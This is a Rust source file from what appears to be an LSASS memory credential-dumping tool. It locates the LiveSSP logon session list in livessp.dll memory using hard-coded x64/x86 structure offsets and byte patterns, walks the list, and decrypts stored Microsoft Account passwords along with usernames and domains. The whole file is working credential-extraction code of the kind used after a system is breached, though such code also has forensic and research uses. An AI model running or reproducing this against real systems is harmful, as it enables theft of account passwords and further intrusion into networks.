use crate::error::Result;
use crate::lsass::crypto::CryptoKeys;
use crate::lsass::patterns;
use crate::lsass::types::{Arch, LiveSspCredential, read_ptr, read_ustring, is_valid_user_ptr, walk_list};
use crate::memory::VirtualMemory;
use crate::pe::parser::PeHeaders;

/// Per-arch offsets for KIWI_LIVESSP_LIST_ENTRY and KIWI_LIVESSP_PRIMARY_CREDENTIAL.
struct LiveSspOffsets {
    luid: u64,
    supp_creds: u64,
    supp_username: u64,
    supp_domain: u64,
    supp_password: u64,
}

const LIVESSP_OFFSETS_X64: LiveSspOffsets = LiveSspOffsets {
    luid: 0x40, supp_creds: 0x60,
    supp_username: 0x08, supp_domain: 0x18, supp_password: 0x28,
};

/// x86 offsets.
const LIVESSP_OFFSETS_X86: LiveSspOffsets = LiveSspOffsets {
    luid: 0x24, supp_creds: 0x38,
    supp_username: 0x08, supp_domain: 0x10, supp_password: 0x18,
};

/// Extract LiveSSP credentials from livessp.dll (unified x64/x86).
///
/// LiveSSP stores Microsoft Account credentials. The DLL may not be loaded
/// on systems that don't use Microsoft Accounts.
pub fn extract_livessp_credentials_arch(
    vmem: &dyn VirtualMemory,
    livessp_base: u64,
    _livessp_size: u32,
    keys: &CryptoKeys,
    arch: Arch,
) -> Result<Vec<(u64, LiveSspCredential)>> {
    let offsets = match arch {
        Arch::X64 => &LIVESSP_OFFSETS_X64,
        Arch::X86 => &LIVESSP_OFFSETS_X86,
    };

    let pe = PeHeaders::parse_from_memory(vmem, livessp_base)?;
    let mut results = Vec::new();

    let text = match pe.find_section(".text") {
        Some(s) => s,
        None => return Ok(results),
    };
    let text_base = livessp_base + text.virtual_address as u64;

    let (pattern_addr, _) = match patterns::find_pattern(
        vmem, text_base, text.virtual_size,
        patterns::LIVESSP_LOGON_SESSION_PATTERNS,
        "LiveGlobalLogonSessionList",
    ) {
        Ok(r) => r,
        Err(e) => {
            log::info!("Could not find LiveSSP pattern: {}", e);
            return Ok(results);
        }
    };

    let list_addr = match arch {
        Arch::X64 => patterns::find_list_via_lea(vmem, pattern_addr, "LiveGlobalLogonSessionList")?,
        Arch::X86 => {
            let ds = match pe.find_section(".data") {
                Some(s) => s,
                None => return Ok(results),
            };
            let data_base = livessp_base + ds.virtual_address as u64;
            let data_end = data_base + ds.virtual_size as u64;
            patterns::find_list_via_abs(vmem, pattern_addr, livessp_base, data_base, data_end, "livessp")?
        }
    };
    log::info!("LiveSSP list at 0x{:x}", list_addr);

    walk_list(vmem, list_addr, arch, |current| {
        let luid = vmem.read_virt_u64(current + offsets.luid).unwrap_or(0);
        let supp_ptr = read_ptr(vmem, current + offsets.supp_creds, arch).unwrap_or(0);

        if is_valid_user_ptr(supp_ptr, arch) {
            let username = read_ustring(vmem, supp_ptr + offsets.supp_username, arch).unwrap_or_default();
            let domain = read_ustring(vmem, supp_ptr + offsets.supp_domain, arch).unwrap_or_default();

            if !username.is_empty() {
                let password = crate::lsass::crypto::decrypt_unicode_string_password_arch(
                    vmem, supp_ptr + offsets.supp_password, keys, arch,
                );
                log::debug!(
                    "LiveSSP: LUID=0x{:x} user={} domain={} pwd_len={}",
                    luid, username, domain, password.len()
                );
                results.push((luid, LiveSspCredential { username, domain, password }));
            }
        }
        true
    })?;

    log::info!("LiveSSP: found {} entries", results.len());
    Ok(results)
}
